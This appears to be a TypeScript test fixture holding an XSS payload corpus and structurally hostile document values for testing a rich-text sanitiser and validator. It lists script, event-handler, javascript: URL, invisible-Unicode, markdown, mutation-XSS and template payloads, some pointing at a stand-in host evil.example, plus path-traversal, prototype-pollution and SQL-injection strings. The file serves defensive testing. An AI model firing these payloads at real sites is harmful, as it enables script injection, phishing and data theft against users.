// M36 WP 2.1 \u2014 the checked-in XSS corpus. Every payload is fed to every untrusted text position (text node,
// link target, mention label, code block, attachment filename, error text) by the server tests and the jsdom
// render tests. Adding a payload here extends all of them. Never remove one to make a test pass.

export interface XssPayload {
  readonly id: string;
  readonly category:
    | "script"
    | "handler"
    | "url-scheme"
    | "unicode"
    | "markdown"
    | "mutation"
    | "template"
    | "filename";
  readonly payload: string;
}

const p = (id: string, category: XssPayload["category"], payload: string): XssPayload => ({
  id,
  category,
  payload,
});

export const XSS_CORPUS: readonly XssPayload[] = [
  p("script-basic", "script", "<script>window.__xss=1</script>"),
  p("script-upper", "script", "<SCRIPT SRC=//evil.example/x.js></SCRIPT>"),
  p("script-split", "script", "<scr<script>ipt>window.__xss=1</scr</script>ipt>"),
  p("script-svg", "script", "<svg><script>window.__xss=1</script></svg>"),
  p("script-nul", "script", "<scr\u0000ipt>window.__xss=1</scr\u0000ipt>"),
  p("img-onerror", "handler", '<img src=x onerror="window.__xss=1">'),
  p("img-onerror-noquote", "handler", "<img/src=x/onerror=window.__xss=1>"),
  p("svg-onload", "handler", "<svg onload=window.__xss=1>"),
  p("body-onload", "handler", "<body onload=window.__xss=1>"),
  p("iframe-srcdoc", "handler", '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>'),
  p("details-ontoggle", "handler", "<details open ontoggle=window.__xss=1>"),
  p("input-autofocus", "handler", "<input autofocus onfocus=window.__xss=1>"),
  p("a-onclick", "handler", '<a href="#" onclick="window.__xss=1">x</a>'),
  p("style-expression", "handler", '<div style="background:url(javascript:window.__xss=1)">'),
  p(
    "meta-refresh",
    "handler",
    '<meta http-equiv="refresh" content="0;url=javascript:window.__xss=1">',
  ),
  p("object-data", "handler", '<object data="javascript:window.__xss=1">'),
  p("javascript-url", "url-scheme", "javascript:window.__xss=1"),
  p("javascript-url-upper", "url-scheme", "JaVaScRiPt:window.__xss=1"),
  p("javascript-url-tab", "url-scheme", "java\tscript:window.__xss=1"),
  p("javascript-url-newline", "url-scheme", "java\nscript:window.__xss=1"),
  p("javascript-url-entity", "url-scheme", "&#106;avascript:window.__xss=1"),
  p("javascript-url-leading-space", "url-scheme", " javascript:window.__xss=1"),
  p("javascript-url-ctrl", "url-scheme", "\u0001javascript:window.__xss=1"),
  p(
    "data-html",
    "url-scheme",
    "data:text/html;base64,PHNjcmlwdD53aW5kb3cuX194c3M9MTwvc2NyaXB0Pg==",
  ),
  p("data-svg", "url-scheme", 'data:image/svg+xml,<svg onload="window.__xss=1">'),
  p("vbscript-url", "url-scheme", "vbscript:msgbox(1)"),
  p("file-url", "url-scheme", "file:///etc/passwd"),
  p("blob-url", "url-scheme", "blob:https://evil.example/uuid"),
  p("protocol-relative", "url-scheme", "//evil.example/phish"),
  p("userinfo-deception", "url-scheme", "https://wardenx.example.com@evil.example/login"),
  p("http-plain", "url-scheme", "http://evil.example/downgrade"),
  p("ftp-url", "url-scheme", "ftp://evil.example/x"),
  p("bidi-override", "unicode", "\u202Eexe.txt\u202D https://evil.example"),
  p("bidi-isolate", "unicode", "\u2066<script>window.__xss=1</script>\u2069"),
  p("zero-width-scheme", "unicode", "java\u200Bscript:window.__xss=1"),
  p("fullwidth-lt", "unicode", "\uFF1Cscript\uFF1Ewindow.__xss=1\uFF1C/script\uFF1E"),
  p("bom-prefix", "unicode", "\uFEFF<img src=x onerror=window.__xss=1>"),
  p("combining-flood", "unicode", `a${"\u0301".repeat(200)}<script>`),
  p("invisible-hangul-filler", "unicode", "\u3164\u3164java\u3164script:window.__xss=1"),
  p("invisible-braille-blank", "unicode", "\u2800<script>window.__xss=1</script>\u2800"),
  p("invisible-halfwidth-hangul", "unicode", "java\uFFA0script:window.__xss=1"),
  p("invisible-cgj", "unicode", "java\u034Fscript:window.__xss=1"),
  p("invisible-mongolian-vs", "unicode", "java\u180Escript:window.__xss=1"),
  p("invisible-khmer", "unicode", "java\u17B4\u17B5script:window.__xss=1"),
  p(
    "invisible-tag-chars",
    "unicode",
    "\u{E0001}\u{E0041}\u{E0042}java\u{E007F}script:window.__xss=1",
  ),
  p("invisible-zwj-scheme", "unicode", "java\u200Dscript:window.__xss=1"),
  p("invisible-zwnj-vs16", "unicode", "java\u200C\uFE0Fscript:window.__xss=1"),
  p("markdown-link-js", "markdown", "[click](javascript:window.__xss=1)"),
  p("markdown-image-js", "markdown", "![x](javascript:window.__xss=1)"),
  p("markdown-autolink", "markdown", "<javascript:window.__xss=1>"),
  p("markdown-ref-link", "markdown", "[x][1]\n\n[1]: javascript:window.__xss=1"),
  p("markdown-html-block", "markdown", "<div onmouseover=window.__xss=1>hover</div>"),
  p("markdown-emphasis-bomb", "markdown", `${"*".repeat(500)}x${"*".repeat(500)}`),
  p(
    "mutation-noscript",
    "mutation",
    '<noscript><p title="</noscript><img src=x onerror=window.__xss=1>">',
  ),
  p(
    "mutation-svg-style",
    "mutation",
    '<svg></p><style><a id="</style><img src=1 onerror=window.__xss=1>">',
  ),
  p(
    "mutation-math",
    "mutation",
    "<math><mtext><table><mglyph><style><img src=x onerror=window.__xss=1>",
  ),
  p("mutation-template", "mutation", "<template><script>window.__xss=1</script></template>"),
  p("mutation-comment", "mutation", "<!--><img src=x onerror=window.__xss=1>-->"),
  p("mutation-cdata", "mutation", "<![CDATA[<script>window.__xss=1</script>]]>"),
  p("template-handlebars", "template", "{{constructor.constructor('window.__xss=1')()}}"),
  p("template-dollar", "template", "${window.__xss=1}"),
  p("template-erb", "template", "<%= window.__xss=1 %>"),
  p("filename-script", "filename", '"><script>window.__xss=1</script>.pdf'),
  p("filename-img", "filename", "x.png<img src=x onerror=window.__xss=1>"),
  p("filename-traversal", "filename", "../../../etc/passwd"),
  p("filename-bidi", "filename", "invoice\u202Efdp.exe"),
];

/** Structurally hostile values (not strings): the validator must reject or neutralise every one. */
export const STRUCTURAL_CORPUS: readonly { readonly id: string; readonly value: unknown }[] = [
  { id: "not-an-object", value: "<script>window.__xss=1</script>" },
  { id: "null", value: null },
  { id: "array", value: [] },
  { id: "wrong-version", value: { schemaVersion: 2, doc: { type: "doc", content: [] } } },
  {
    id: "extra-top-key",
    value: { schemaVersion: 1, doc: { type: "doc", content: [] }, html: "<b>x</b>" },
  },
  {
    id: "raw-html-node",
    value: {
      schemaVersion: 1,
      doc: { type: "doc", content: [{ type: "html", html: "<script>1</script>" }] },
    },
  },
  {
    id: "image-node",
    value: {
      schemaVersion: 1,
      doc: { type: "doc", content: [{ type: "image", src: "https://evil.example/x.png" }] },
    },
  },
  {
    id: "attrs-bag",
    value: {
      schemaVersion: 1,
      doc: { type: "doc", content: [{ type: "paragraph", attrs: { onclick: "x" }, content: [] }] },
    },
  },
  {
    id: "text-with-onclick",
    value: {
      schemaVersion: 1,
      doc: {
        type: "doc",
        content: [
          { type: "paragraph", content: [{ type: "text", text: "x", onclick: "window.__xss=1" }] },
        ],
      },
    },
  },
  {
    id: "proto-pollution",
    value: JSON.parse(
      '{"schemaVersion":1,"__proto__":{"polluted":true},"doc":{"type":"doc","content":[]}}',
    ),
  },
  {
    id: "link-mark-style",
    value: {
      schemaVersion: 1,
      doc: {
        type: "doc",
        content: [
          {
            type: "paragraph",
            content: [
              {
                type: "text",
                text: "x",
                marks: [{ type: "link", href: "https://a.example", style: "x" }],
              },
            ],
          },
        ],
      },
    },
  },
  {
    id: "unknown-mark",
    value: {
      schemaVersion: 1,
      doc: {
        type: "doc",
        content: [
          {
            type: "paragraph",
            content: [{ type: "text", text: "x", marks: [{ type: "script" }] }],
          },
        ],
      },
    },
  },
  {
    id: "mention-bad-id",
    value: {
      schemaVersion: 1,
      doc: {
        type: "doc",
        content: [
          {
            type: "paragraph",
            content: [{ type: "mention", kind: "staff", entityId: "1' OR '1'='1", label: "x" }],
          },
        ],
      },
    },
  },
  {
    id: "text-not-string",
    value: {
      schemaVersion: 1,
      doc: {
        type: "doc",
        content: [{ type: "paragraph", content: [{ type: "text", text: { toString: "x" } }] }],
      },
    },
  },
];

/** A doc nested `depth` lists deep. */
export function nestedListDoc(depth: number): unknown {
  let inner: unknown = { type: "paragraph", content: [{ type: "text", text: "x" }] };
  for (let i = 0; i < depth; i += 1) {
    inner = { type: "bulletList", content: [{ type: "listItem", content: [inner] }] };
  }
  return { schemaVersion: 1, doc: { type: "doc", content: [inner] } };
}

/** A doc with `count` text nodes in one paragraph. */
export function wideDoc(count: number): unknown {
  return {
    schemaVersion: 1,
    doc: {
      type: "doc",
      content: [
        {
          type: "paragraph",
          content: Array.from({ length: count }, () => ({ type: "text", text: "x" })),
        },
      ],
    },
  };
}
